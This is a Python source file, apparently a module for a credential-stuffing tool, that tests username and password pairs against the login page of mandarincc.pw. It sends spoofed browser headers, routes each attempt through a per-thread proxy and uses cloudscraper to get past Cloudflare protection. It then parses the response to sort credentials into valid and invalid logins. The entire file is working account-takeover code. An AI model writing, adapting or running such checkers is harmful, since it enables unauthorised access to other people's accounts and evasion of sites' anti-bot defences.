"""
Checker for mandarincc.pw – content-based success detection.
"""
import threading
from typing import Tuple

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://mandarincc.pw"
LOGIN_URL = BASE_URL + "/login.html"
TIMEOUT = 15

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/index.html",
    })

    payload = {
        "username": username,
        "user_password": password,
    }

    try:
        resp = session.post(LOGIN_URL, data=payload, allow_redirects=True, timeout=TIMEOUT)

        if resp.status_code != 200:
            return False, f"HTTP {resp.status_code} – server error"

        html = resp.text.lower()
        final_url = resp.url.lower()

        # ---- Explicit failure (catch variations) ----
        if any(phrase in html for phrase in [
            "invalid login", "invalid login or pass", "invalid username",
            "incorrect", "wrong password", "login failed"
        ]):
            return False, "Invalid credentials"

        # ---- Check if we are still on a page with the login form ----
        if 'name="username"' in html or 'name="user_password"' in html:
            return False, "Login failed – login form still present"

        # ---- Success indicators ----
        if "logout" in html or "dashboard" in html or "welcome" in html:
            return True, "Login successful"

        # ---- Fallback: if no login form and no error, assume success ----
        if "login.html" not in final_url and "index.html" in final_url:
            return True, "Login successful"

        # ---- Still on login page? ----
        if "login.html" in final_url:
            return False, "Login failed – still on login page"

        return False, "Login failed – unknown reason"

    except Exception as e:
        return False, f"Request error: {str(e)}"